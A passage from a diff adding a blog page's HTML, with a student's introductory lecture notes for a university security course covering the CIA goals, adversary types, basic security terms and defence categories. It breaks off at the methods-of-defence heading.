@@ -1,0 +1,3373 @@
+<!DOCTYPE html>
+<html lang="en" data-theme="">
+<head>
+    
+    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+    <meta name = "apple-mobile-web-app-capable" content = "yes">
+    <meta name="theme-color" content="#121212">
+
+    <meta charset="utf-8">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="referrer" content="no-referrer-when-downgrade">
+    <title>CS 489 Security - ELL Blog</title>
+    <meta name="description" content="Introduction
+
+    
+        
+    
+
+Assignments
+
+    
+        
+    
+
+
+4 Assignments worth 25% each
+Written and/or programming
+Start ASAP
+
+
+  
+      
+          Assignment
+          Start Date
+          Due Date
+          Days Given
+          Grade Weight
+      
+  
+  
+      
+          1
+          Jan 23
+          Feb 09
+          17
+          25%
+      
+      
+          2
+          Feb 13
+          Mar 01
+          17
+          25%
+      
+      
+          3
+          Mar 05
+          Mar 22
+          17
+          25%
+      
+      
+          4
+          Mar 26
+          Apr 05
+          10
+          25%
+      
+  
+
+Textbooks
+
+    
+        
+    
+
+
+Computer Security and the Internet
+Security in Computing 5th edition
+
+Goals (CIA)
+
+    
+        
+    
+
+
+Confidentiality: limiting access to authorized parties
+Integrity: when you receive data, you get the &ldquo;right&rdquo; data
+Availability: the system or data is there when you want it
+
+Hardest to uphold since attacker has many ways to take down a system
+
+
+
+Security and Privacy
+
+    
+        
+    
+
+
+When the entities are different, they may appear to be opposing, but when the entity is the same (you), then it works complimentary
+
+Airport Security
+App sandboxing and permissions
+PIPEDA (Personal Information Protection and Electronic Documents Act) for private-sector privacy legislation
+
+Forthcoming Consumer Privacy Protection Act to modernize protection: meaningful consent, right to erasure
+
+
+
+
+
+Adversaries
+
+    
+        
+    
+
+
+Murphy Amateurs
+
+Bugs waiting to be exploited
+
+
+Script kiddies
+
+People who just copy attacks from other people
+
+
+Crackers or Hackers
+
+Hacker is a general term, not necessarily related to security
+Cracker is 100% only related to writing things for script kiddies and etc.
+
+
+Organized crime
+Government &ldquo;cyberwarriors&rdquo;
+Terrorists
+
+Terminology
+
+    
+        
+    
+
+
+Assets
+Vulnerability
+
+Weaknesses that may be able to be exploited
+e.g. file server without authentication
+API to access GPS coordinates without authenticating apps
+
+
+Threats
+
+A loss or harm
+Interception
+Interruption
+Modification
+Fabrication
+
+
+Attack
+
+An action which exploits a vulnerability to execute a threat
+
+
+Control/Defence
+
+Removing or reducing a vulnerability
+Prevent an attack and defend against a threat
+
+
+
+Methods of Defence
+
+    
+        
+    
+
+
+Prevent it
+Deter it
+Deflect it: make yourself less attractive to attacker (Xbox)
+Detect it
+Recover from it
+Defence in depth
+Your car may get stolen
+
+Park inside your garage
+Lock your car
+Insurance
+
+
+
+Weakest Link
+
+    
+        
+    
+
+
+A system is only as strong as its weakest link
+
+Defence of Computer Systems
+
+    
+        
+    
+
+
+Cryptography
+
+Digital signatures
+Cryptographic protocols
+Unreadable to an attacker
+
+
+Software Controls
+
+Passwords
+Separate user actions from each other
+Virus scanner
+Development controls
+Firewalls
+
+
+Hardware Controls
+
+Fingerprint
+Smart tokens
+Trusted Execution Environments (TEEs)
+
+
+Physical Controls
+
+Locks
+Guards
+Off-site backups
+
+
+Policies and Procedures
+
+Non-technical means can be used to protect against some classes of attack
+Rules about choosing passwords
+Training in best security practices
+VPN
+
+
+
+Program Security
+
+    
+        
+    
+
+Linux Security Basics
+
+    
+        
+    
+
+What is the root user, and what is sudo, and how does it work?">
+    
+    <link rel="icon" type="image/x-icon" href="https://blog.elijahlopez.ca/favicon.ico">
+    <link rel="apple-touch-icon-precomposed" href="https://blog.elijahlopez.ca/favicon.png">
+
+    <link rel="stylesheet" href="https://blog.elijahlopez.ca/css/style.min.aaf2c7fda9310c97167f1a94f41891944861efa73f96c5467dbea9ecc5ddb751.css" integrity="sha256-qvLH/akxDJcWfxqU9BiRlEhh76c/lsVGfb6p7MXdt1E=">
+    <script src="https://blog.elijahlopez.ca/js/script.min.74bf1a3fcf1af396efa4acf3e660e876b61a2153ab9cbe1893ac24ea6d4f94ee.js" type="text/javascript" charset="utf-8" integrity="sha256-dL8aP88a85bvpKzz5mDodrYaIVOrnL4Yk6wk6m1PlO4="></script>
+    <meta property="og:url" content="https://blog.elijahlopez.ca/posts/university/cs-489-security/">
+  <meta property="og:site_name" content="ELL Blog">
+  <meta property="og:title" content="CS 489 Security">
+  <meta property="og:description" content="Introduction Assignments 4 Assignments worth 25% each Written and/or programming Start ASAP Assignment Start Date Due Date Days Given Grade Weight 1 Jan 23 Feb 09 17 25% 2 Feb 13 Mar 01 17 25% 3 Mar 05 Mar 22 17 25% 4 Mar 26 Apr 05 10 25% Textbooks Computer Security and the Internet Security in Computing 5th edition Goals (CIA) Confidentiality: limiting access to authorized parties Integrity: when you receive data, you get the “right” data Availability: the system or data is there when you want it Hardest to uphold since attacker has many ways to take down a system Security and Privacy When the entities are different, they may appear to be opposing, but when the entity is the same (you), then it works complimentary Airport Security App sandboxing and permissions PIPEDA (Personal Information Protection and Electronic Documents Act) for private-sector privacy legislation Forthcoming Consumer Privacy Protection Act to modernize protection: meaningful consent, right to erasure Adversaries Murphy Amateurs Bugs waiting to be exploited Script kiddies People who just copy attacks from other people Crackers or Hackers Hacker is a general term, not necessarily related to security Cracker is 100% only related to writing things for script kiddies and etc. Organized crime Government “cyberwarriors” Terrorists Terminology Assets Vulnerability Weaknesses that may be able to be exploited e.g. file server without authentication API to access GPS coordinates without authenticating apps Threats A loss or harm Interception Interruption Modification Fabrication Attack An action which exploits a vulnerability to execute a threat Control/Defence Removing or reducing a vulnerability Prevent an attack and defend against a threat Methods of Defence Prevent it Deter it Deflect it: make yourself less attractive to attacker (Xbox) Detect it Recover from it Defence in depth Your car may get stolen Park inside your garage Lock your car Insurance Weakest Link A system is only as strong as its weakest link Defence of Computer Systems Cryptography Digital signatures Cryptographic protocols Unreadable to an attacker Software Controls Passwords Separate user actions from each other Virus scanner Development controls Firewalls Hardware Controls Fingerprint Smart tokens Trusted Execution Environments (TEEs) Physical Controls Locks Guards Off-site backups Policies and Procedures Non-technical means can be used to protect against some classes of attack Rules about choosing passwords Training in best security practices VPN Program Security Linux Security Basics What is the root user, and what is sudo, and how does it work?">
+  <meta property="og:locale" content="en">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="posts">
+    <meta property="article:published_time" content="2024-01-09T11:33:24-05:00">
+    <meta property="article:modified_time" content="2024-01-09T11:33:24-05:00">
+    <meta property="article:tag" content="University">
+    <meta property="article:tag" content="Cybersecurity">
+    <meta property="article:tag" content="Computer-Science">
+    <meta property="og:image" content="https://blog.elijahlopez.ca/images">
+
+  <meta name="twitter:card" content="summary_large_image">
+  <meta name="twitter:image" content="https://blog.elijahlopez.ca/images">
+  <meta name="twitter:title" content="CS 489 Security">
+  <meta name="twitter:description" content="Introduction Assignments 4 Assignments worth 25% each Written and/or programming Start ASAP Assignment Start Date Due Date Days Given Grade Weight 1 Jan 23 Feb 09 17 25% 2 Feb 13 Mar 01 17 25% 3 Mar 05 Mar 22 17 25% 4 Mar 26 Apr 05 10 25% Textbooks Computer Security and the Internet Security in Computing 5th edition Goals (CIA) Confidentiality: limiting access to authorized parties Integrity: when you receive data, you get the “right” data Availability: the system or data is there when you want it Hardest to uphold since attacker has many ways to take down a system Security and Privacy When the entities are different, they may appear to be opposing, but when the entity is the same (you), then it works complimentary Airport Security App sandboxing and permissions PIPEDA (Personal Information Protection and Electronic Documents Act) for private-sector privacy legislation Forthcoming Consumer Privacy Protection Act to modernize protection: meaningful consent, right to erasure Adversaries Murphy Amateurs Bugs waiting to be exploited Script kiddies People who just copy attacks from other people Crackers or Hackers Hacker is a general term, not necessarily related to security Cracker is 100% only related to writing things for script kiddies and etc. Organized crime Government “cyberwarriors” Terrorists Terminology Assets Vulnerability Weaknesses that may be able to be exploited e.g. file server without authentication API to access GPS coordinates without authenticating apps Threats A loss or harm Interception Interruption Modification Fabrication Attack An action which exploits a vulnerability to execute a threat Control/Defence Removing or reducing a vulnerability Prevent an attack and defend against a threat Methods of Defence Prevent it Deter it Deflect it: make yourself less attractive to attacker (Xbox) Detect it Recover from it Defence in depth Your car may get stolen Park inside your garage Lock your car Insurance Weakest Link A system is only as strong as its weakest link Defence of Computer Systems Cryptography Digital signatures Cryptographic protocols Unreadable to an attacker Software Controls Passwords Separate user actions from each other Virus scanner Development controls Firewalls Hardware Controls Fingerprint Smart tokens Trusted Execution Environments (TEEs) Physical Controls Locks Guards Off-site backups Policies and Procedures Non-technical means can be used to protect against some classes of attack Rules about choosing passwords Training in best security practices VPN Program Security Linux Security Basics What is the root user, and what is sudo, and how does it work?">
+
+
+
+
+
+
+    
+
+
+
+
+
+</head>
+
+<body>
+    <a class="skip-main" href="#main">Skip to main content</a>
+    <div class="container">
+        <header class="common-header">
+            
+                
+
+    
+
+
+<div class="header-top">
+    <h1 class="site-title">
+        <a href="/">ELL Blog</a>
+    </h1>
+
+    <div class="header-top-left">
+    <ul class="social-icons">
+
+        <li>
+            <a href="/index.xml" title="Rss" rel="me">
+                <span class="inline-svg" >
+                    <svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" data-icon="rss" data-prefix="fas" focusable="false" role="img" viewBox="0 0 496 512"><path fill="currentColor" fill="currentColor" d="M128.081 415.959c0 35.369-28.672 64.041-64.041 64.041S0 451.328 0 415.959s28.672-64.041 64.041-64.041 64.04 28.673 64.04 64.041zm175.66 47.25c-8.354-154.6-132.185-278.587-286.95-286.95C7.656 175.765 0 183.105 0 192.253v48.069c0 8.415 6.49 15.472 14.887 16.018 111.832 7.284 201.473 96.702 208.772 208.772.547 8.397 7.604 14.887 16.018 14.887h48.069c9.149.001 16.489-7.655 15.995-16.79zm144.249.288C439.596 229.677 251.465 40.445 16.503 32.01 7.473 31.686 0 38.981 0 48.016v48.068c0 8.625 6.835 15.645 15.453 15.999 191.179 7.839 344.627 161.316 352.465 352.465.353 8.618 7.373 15.453 15.999 15.453h48.068c9.034-.001 16.329-7.474 16.005-16.504z"/></svg>
+                </span>
+
+            </a>
+        </li>
+    
+
+        <li>
+            <a href="https://elijahlopez.ca" title="Website" rel="me">
+                <span class="inline-svg" >
+                    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M352 256C352 278.2 350.8 299.6 348.7 320H163.3C161.2 299.6 159.1 278.2 159.1 256C159.1 233.8 161.2 212.4 163.3 192H348.7C350.8 212.4 352 233.8 352 256zM503.9 192C509.2 212.5 512 233.9 512 256C512 278.1 509.2 299.5 503.9 320H380.8C382.9 299.4 384 277.1 384 256C384 234 382.9 212.6 380.8 192H503.9zM493.4 160H376.7C366.7 96.14 346.9 42.62 321.4 8.442C399.8 29.09 463.4 85.94 493.4 160zM344.3 160H167.7C173.8 123.6 183.2 91.38 194.7 65.35C205.2 41.74 216.9 24.61 228.2 13.81C239.4 3.178 248.7 0 256 0C263.3 0 272.6 3.178 283.8 13.81C295.1 24.61 306.8 41.74 317.3 65.35C328.8 91.38 338.2 123.6 344.3 160H344.3zM18.61 160C48.59 85.94 112.2 29.09 190.6 8.442C165.1 42.62 145.3 96.14 135.3 160H18.61zM131.2 192C129.1 212.6 127.1 234 127.1 256C127.1 277.1 129.1 299.4 131.2 320H8.065C2.8 299.5 0 278.1 0 256C0 233.9 2.8 212.5 8.065 192H131.2zM194.7 446.6C183.2 420.6 173.8 388.4 167.7 352H344.3C338.2 388.4 328.8 420.6 317.3 446.6C306.8 470.3 295.1 487.4 283.8 498.2C272.6 508.8 263.3 512 255.1 512C248.7 512 239.4 508.8 228.2 498.2C216.9 487.4 205.2 470.3 194.7 446.6H194.7zM190.6 503.6C112.2 482.9 48.59 426.1 18.61 352H135.3C145.3 415.9 165.1 469.4 190.6 503.6V503.6zM321.4 503.6C346.9 469.4 366.7 415.9 376.7 352H493.4C463.4 426.1 399.8 482.9 321.4 503.6V503.6z"/></svg>
+                </span>
+
+            </a>
+        </li>
+    
+
+        
+        
+        <li>
+            <a href="https://github.com/elibroftw" title="Github" rel="me">
+            <span class="inline-svg" >
+                    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 496 512"><path fill="currentColor" d="M165.9 397.4c0 2-2.3 3.6-5.2 3.6-3.3.3-5.6-1.3-5.6-3.6 0-2 2.3-3.6 5.2-3.6 3-.3 5.6 1.3 5.6 3.6zm-31.1-4.5c-.7 2 1.3 4.3 4.3 4.9 2.6 1 5.6 0 6.2-2s-1.3-4.3-4.3-5.2c-2.6-.7-5.5.3-6.2 2.3zm44.2-1.7c-2.9.7-4.9 2.6-4.6 4.9.3 2 2.9 3.3 5.9 2.6 2.9-.7 4.9-2.6 4.6-4.6-.3-1.9-3-3.2-5.9-2.9zM244.8 8C106.1 8 0 113.3 0 252c0 110.9 69.8 205.8 169.5 239.2 12.8 2.3 17.3-5.6 17.3-12.1 0-6.2-.3-40.4-.3-61.4 0 0-70 15-84.7-29.8 0 0-11.4-29.1-27.8-36.6 0 0-22.9-15.7 1.6-15.4 0 0 24.9 2 38.6 25.8 21.9 38.6 58.6 27.5 72.9 20.9 2.3-16 8.8-27.1 16-33.7-55.9-6.2-112.3-14.3-112.3-110.5 0-27.5 7.6-41.3 23.6-58.9-2.6-6.5-11.1-33.3 2.6-67.9 20.9-6.5 69 27 69 27 20-5.6 41.5-8.5 62.8-8.5s42.8 2.9 62.8 8.5c0 0 48.1-33.6 69-27 13.7 34.7 5.2 61.4 2.6 67.9 16 17.7 25.8 31.5 25.8 58.9 0 96.5-58.9 104.2-114.8 110.5 9.2 7.9 17 22.9 17 46.4 0 33.7-.3 75.4-.3 83.6 0 6.5 4.6 14.4 17.3 12.1C428.2 457.8 496 362.9 496 252 496 113.3 383.5 8 244.8 8zM97.2 352.9c-1.3 1-1 3.3.7 5.2 1.6 1.6 3.9 2.3 5.2 1 1.3-1 1-3.3-.7-5.2-1.6-1.6-3.9-2.3-5.2-1zm-10.8-8.1c-.7 1.3.3 2.9 2.3 3.9 1.6 1 3.6.7 4.3-.7.7-1.3-.3-2.9-2.3-3.9-2-.6-3.6-.3-4.3.7zm32.4 35.6c-1.6 1.3-1 4.3 1.3 6.2 2.3 2.3 5.2 2.6 6.5 1 1.3-1.3.7-4.3-1.3-6.2-2.2-2.3-5.2-2.6-6.5-1zm-11.4-14.7c-1.6 1-1.6 3.6 0 5.9 1.6 2.3 4.3 3.3 5.6 2.3 1.6-1.3 1.6-3.9 0-6.2-1.4-2.3-4-3.3-5.6-2z"/></svg>
+                </span>
+
+            </a>
+        </li>
+    
+
+        
+        
+        <li>
+            <a href="https://twitter.com/elibroftw" title="Twitter" rel="me">
+            <span class="inline-svg" >
+                    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M459.37 151.716c.325 4.548.325 9.097.325 13.645 0 138.72-105.583 298.558-298.558 298.558-59.452 0-114.68-17.219-161.137-47.106 8.447.974 16.568 1.299 25.34 1.299 49.055 0 94.213-16.568 130.274-44.832-46.132-.975-84.792-31.188-98.112-72.772 6.498.974 12.995 1.624 19.818 1.624 9.421 0 18.843-1.3 27.614-3.573-48.081-9.747-84.143-51.98-84.143-102.985v-1.299c13.969 7.797 30.214 12.67 47.431 13.319-28.264-18.843-46.781-51.005-46.781-87.391 0-19.492 5.197-37.36 14.294-52.954 51.655 63.675 129.3 105.258 216.365 109.807-1.624-7.797-2.599-15.918-2.599-24.04 0-57.828 46.782-104.934 104.934-104.934 30.213 0 57.502 12.67 76.67 33.137 23.715-4.548 46.456-13.32 66.599-25.34-7.798 24.366-24.366 44.833-46.132 57.827 21.117-2.273 41.584-8.122 60.426-16.243-14.292 20.791-32.161 39.308-52.628 54.253z"/></svg>
+                </span>
+
+            </a>
+        </li>
+    
+
+        
+        
+        <li>
+            <a href="https://www.youtube.com/c/elibroftw" title="Youtube" rel="me">
+            <span class="inline-svg" >
+                    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 576 512"><path fill="currentColor" d="M549.655 124.083c-6.281-23.65-24.787-42.276-48.284-48.597C458.781 64 288 64 288 64S117.22 64 74.629 75.486c-23.497 6.322-42.003 24.947-48.284 48.597-11.412 42.867-11.412 132.305-11.412 132.305s0 89.438 11.412 132.305c6.281 23.65 24.787 41.5 48.284 47.821C117.22 448 288 448 288 448s170.78 0 213.371-11.486c23.497-6.321 42.003-24.171 48.284-47.821 11.412-42.867 11.412-132.305 11.412-132.305s0-89.438-11.412-132.305zm-317.51 213.508V175.185l142.739 81.205-142.739 81.201z"/></svg>
+                </span>
+
+            </a>
+        </li>
+    
+
+        
+        
+        <li>
+            <a href="mailto:elijahllopezz@gmail.com" title="Email" rel="me">
+            <span class="inline-svg" >
+                    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M464 64H48C21.49 64 0 85.49 0 112v288c0 26.51 21.49 48 48 48h416c26.51 0 48-21.49 48-48V112c0-26.51-21.49-48-48-48zm0 48v40.805c-22.422 18.259-58.168 46.651-134.587 106.49-16.841 13.247-50.201 45.072-73.413 44.701-23.208.375-56.579-31.459-73.413-44.701C106.18 199.465 70.425 171.067 48 152.805V112h416zM48 400V214.398c22.914 18.251 55.409 43.862 104.938 82.646 21.857 17.205 60.134 55.186 103.062 54.955 42.717.231 80.509-37.199 103.053-54.947 49.528-38.783 82.032-64.401 104.947-82.653V400H48z"/></svg>
+                </span>
+
+            </a>
+        </li>
+    
+
+        
+        
+        <li>
+            <a href="https://www.instagram.com/elijahllopezz" title="Instagram" rel="me">
+            <span class="inline-svg" >
+                    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512"><path fill="currentColor" d="M224.1 141c-63.6 0-114.9 51.3-114.9 114.9s51.3 114.9 114.9 114.9S339 319.5 339 255.9 287.7 141 224.1 141zm0 189.6c-41.1 0-74.7-33.5-74.7-74.7s33.5-74.7 74.7-74.7 74.7 33.5 74.7 74.7-33.6 74.7-74.7 74.7zm146.4-194.3c0 14.9-12 26.8-26.8 26.8-14.9 0-26.8-12-26.8-26.8s12-26.8 26.8-26.8 26.8 12 26.8 26.8zm76.1 27.2c-1.7-35.9-9.9-67.7-36.2-93.9-26.2-26.2-58-34.4-93.9-36.2-37-2.1-147.9-2.1-184.9 0-35.8 1.7-67.6 9.9-93.9 36.1s-34.4 58-36.2 93.9c-2.1 37-2.1 147.9 0 184.9 1.7 35.9 9.9 67.7 36.2 93.9s58 34.4 93.9 36.2c37 2.1 147.9 2.1 184.9 0 35.9-1.7 67.7-9.9 93.9-36.2 26.2-26.2 34.4-58 36.2-93.9 2.1-37 2.1-147.8 0-184.8zM398.8 388c-7.8 19.6-22.9 34.7-42.6 42.6-29.5 11.7-99.5 9-132.1 9s-102.7 2.6-132.1-9c-19.6-7.8-34.7-22.9-42.6-42.6-11.7-29.5-9-99.5-9-132.1s-2.6-102.7 9-132.1c7.8-19.6 22.9-34.7 42.6-42.6 29.5-11.7 99.5-9 132.1-9s102.7-2.6 132.1 9c19.6 7.8 34.7 22.9 42.6 42.6 11.7 29.5 9 99.5 9 132.1s2.7 102.7-9 132.1z"/></svg>
+                </span>
+
+            </a>
+        </li>
+    
+
+
+
+</ul>
+</div>
+    
+
+    
+
+
+
+
+    <div class="header-top-right theme-switcher">
+        <span class="inline-svg" >
+                    <svg xmlns:xlink="http://www.w3.org/1999/xlink" viewBox="0 0 290 290">
+<path fill="currentColor" d="M142.959,0C64.131,0,0,64.132,0,142.96c0,78.828,64.131,142.959,142.959,142.959c78.828,0,142.96-64.131,142.96-142.959  C285.919,64.132,221.787,0,142.959,0z M142.959,260.919V142.96V25c65.043,0,117.96,52.917,117.96,117.96  C260.919,208.003,208.002,260.919,142.959,260.919z"/>
+</svg>
+                </span>
+
+    </div>
+
+
+<script>
+const STORAGE_KEY = 'user-color-scheme'
+const defaultTheme = "auto"
+
+let currentTheme
+let switchButton
+let autoDefinedScheme = window.matchMedia('(prefers-color-scheme: dark)')
+
+const autoChangeScheme = e => {
+    currentTheme = e.matches ? 'dark' : 'light'
+    document.documentElement.setAttribute('data-theme', currentTheme)
+}
+
+document.addEventListener('DOMContentLoaded', function() {
+    switchButton = document.querySelector('.theme-switcher')
+    currentTheme = detectCurrentScheme()
+    setThemeColorMeta(currentTheme)
+    if (currentTheme == 'dark') {
+        document.documentElement.setAttribute('data-theme', 'dark')
+    }
+
+    if (currentTheme == 'auto') {
+        autoChangeScheme(autoDefinedScheme);
+        autoDefinedScheme.addListener(autoChangeScheme);
+    }
+
+    if (switchButton) {
+        switchButton.addEventListener('click', switchTheme, false)
+    }
+})
+
+function detectCurrentScheme() {
+    if (localStorage !== null && localStorage.getItem(STORAGE_KEY)) {
+        return localStorage.getItem(STORAGE_KEY)
+    }
+    if (defaultTheme) {
+        return defaultTheme
+    }
+    if (!window.matchMedia) {
+        return defaultTheme
+    }
+    if (window.matchMedia('(prefers-color-scheme: dark)').matches) {
+        return 'dark'
+    }
+    return defaultTheme
+}
+
+function switchTheme(e) {
+    if (currentTheme == 'dark') {
+        if (localStorage !== null)
+            localStorage.setItem(STORAGE_KEY, 'light')
+        document.documentElement.setAttribute('data-theme', 'light')
+        currentTheme = 'light'
+    } else {
+        if (localStorage !== null)
+            localStorage.setItem(STORAGE_KEY, 'dark')
+        document.documentElement.setAttribute('data-theme', 'dark')
+        currentTheme = 'dark'
+    }
+    setThemeColorMeta(currentTheme)
+}
+
+function setThemeColorMeta(currentTheme) {
+    if (currentTheme == 'dark') {
+        document.querySelector('meta[name="theme-color"]').setAttribute('content', '#121212')
+    } else {
+        document.querySelector('meta[name="theme-color"]').setAttribute('content', '#fff')
+    }
+}
+</script>
+
+</div>
+
+
+    <nav>
+        
+        
+        <a class="" href="https://blog.elijahlopez.ca/" title="Home">Home</a>
+        
+        <a class="" href="https://blog.elijahlopez.ca/posts/" title="Archive">Archive</a>
+        
+        <a class="" href="https://blog.elijahlopez.ca/tags/" title="Tags">Tags</a>
+        
+    </nav>
+
+
+
+
+
+
+            
+        </header>
+        <main id="main" tabindex="-1">
+            
+    
+
+    <article class="post h-entry">
+        <div class="post-header">
+            <header>
+                <h1 class="p-name post-title">CS 489 Security</h1>
+
+                
+            </header>
+        </div>
+        
+
+
+
+
+        <div class="content e-content">
+            <h2 id="introduction" >Introduction
+<span>
+    <a href="#introduction">
+        <svg viewBox="0 0 28 23" height="100%" width="19" xmlns="http://www.w3.org/2000/svg"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/></svg>
+    </a>
+</span>
+</h2><h3 id="assignments" >Assignments
+<span>
+    <a href="#assignments">
+        <svg viewBox="0 0 28 23" height="100%" width="19" xmlns="http://www.w3.org/2000/svg"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/></svg>
+    </a>
+</span>
+</h3><ul>
+<li>4 <a href="https://cs.uwaterloo.ca/~m285xu/courses/cs489-w24/assignments/">Assignments</a> worth 25% each</li>
+<li>Written and/or programming</li>
+<li>Start ASAP</li>
+</ul>
+<table>
+  <thead>
+      <tr>
+          <th>Assignment</th>
+          <th>Start Date</th>
+          <th>Due Date</th>
+          <th>Days Given</th>
+          <th>Grade Weight</th>
+      </tr>
+  </thead>
+  <tbody>
+      <tr>
+          <td>1</td>
+          <td>Jan 23</td>
+          <td>Feb 09</td>
+          <td>17</td>
+          <td>25%</td>
+      </tr>
+      <tr>
+          <td>2</td>
+          <td>Feb 13</td>
+          <td>Mar 01</td>
+          <td>17</td>
+          <td>25%</td>
+      </tr>
+      <tr>
+          <td>3</td>
+          <td>Mar 05</td>
+          <td>Mar 22</td>
+          <td>17</td>
+          <td>25%</td>
+      </tr>
+      <tr>
+          <td>4</td>
+          <td>Mar 26</td>
+          <td>Apr 05</td>
+          <td>10</td>
+          <td>25%</td>
+      </tr>
+  </tbody>
+</table>
+<h3 id="textbooks" >Textbooks
+<span>
+    <a href="#textbooks">
+        <svg viewBox="0 0 28 23" height="100%" width="19" xmlns="http://www.w3.org/2000/svg"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/></svg>
+    </a>
+</span>
+</h3><ul>
+<li><a href="https://link.springer.com/book/10.1007/978-3-030-83411-13th">Computer Security and the Internet</a></li>
+<li><a href="https://eopcw.com/assets/stores/Computer%20Security/lecturenote_1704978481security-in-computing-5-e.pdf">Security in Computing 5th edition</a></li>
+</ul>
+<h3 id="goals-cia" >Goals (CIA)
+<span>
+    <a href="#goals-cia">
+        <svg viewBox="0 0 28 23" height="100%" width="19" xmlns="http://www.w3.org/2000/svg"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/></svg>
+    </a>
+</span>
+</h3><ul>
+<li>Confidentiality: limiting access to authorized parties</li>
+<li>Integrity: when you receive data, you get the &ldquo;right&rdquo; data</li>
+<li>Availability: the system or data is there when you want it
+<ul>
+<li>Hardest to uphold since attacker has many ways to take down a system</li>
+</ul>
+</li>
+</ul>
+<h3 id="security-and-privacy" >Security and Privacy
+<span>
+    <a href="#security-and-privacy">
+        <svg viewBox="0 0 28 23" height="100%" width="19" xmlns="http://www.w3.org/2000/svg"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/></svg>
+    </a>
+</span>
+</h3><ul>
+<li>When the entities are different, they may appear to be opposing, but when the entity is the same (you), then it works complimentary
+<ul>
+<li>Airport Security</li>
+<li>App sandboxing and permissions</li>
+<li>PIPEDA (Personal Information Protection and Electronic Documents Act) for private-sector privacy legislation
+<ul>
+<li>Forthcoming Consumer Privacy Protection Act to modernize protection: meaningful consent, right to erasure</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+<h3 id="adversaries" >Adversaries
+<span>
+    <a href="#adversaries">
+        <svg viewBox="0 0 28 23" height="100%" width="19" xmlns="http://www.w3.org/2000/svg"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/></svg>
+    </a>
+</span>
+</h3><ul>
+<li>Murphy Amateurs
+<ul>
+<li>Bugs waiting to be exploited</li>
+</ul>
+</li>
+<li>Script kiddies
+<ul>
+<li>People who just copy attacks from other people</li>
+</ul>
+</li>
+<li>Crackers or Hackers
+<ul>
+<li>Hacker is a general term, not necessarily related to security</li>
+<li>Cracker is 100% only related to writing things for script kiddies and etc.</li>
+</ul>
+</li>
+<li>Organized crime</li>
+<li>Government &ldquo;cyberwarriors&rdquo;</li>
+<li>Terrorists</li>
+</ul>
+<h3 id="terminology" >Terminology
+<span>
+    <a href="#terminology">
+        <svg viewBox="0 0 28 23" height="100%" width="19" xmlns="http://www.w3.org/2000/svg"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/></svg>
+    </a>
+</span>
+</h3><ul>
+<li>Assets</li>
+<li>Vulnerability
+<ul>
+<li>Weaknesses that may be able to be exploited</li>
+<li>e.g. file server without authentication</li>
+<li>API to access GPS coordinates without authenticating apps</li>
+</ul>
+</li>
+<li>Threats
+<ul>
+<li>A loss or harm</li>
+<li>Interception</li>
+<li>Interruption</li>
+<li>Modification</li>
+<li>Fabrication</li>
+</ul>
+</li>
+<li>Attack
+<ul>
+<li>An action which exploits a vulnerability to execute a threat</li>
+</ul>
+</li>
+<li>Control/Defence
+<ul>
+<li>Removing or reducing a vulnerability</li>
+<li>Prevent an attack and defend against a threat</li>
+</ul>
+</li>
+</ul>
+<h3 id="methods-of-defence" >Methods of Defence
+<span>
+    <a href="#methods-of-defence">
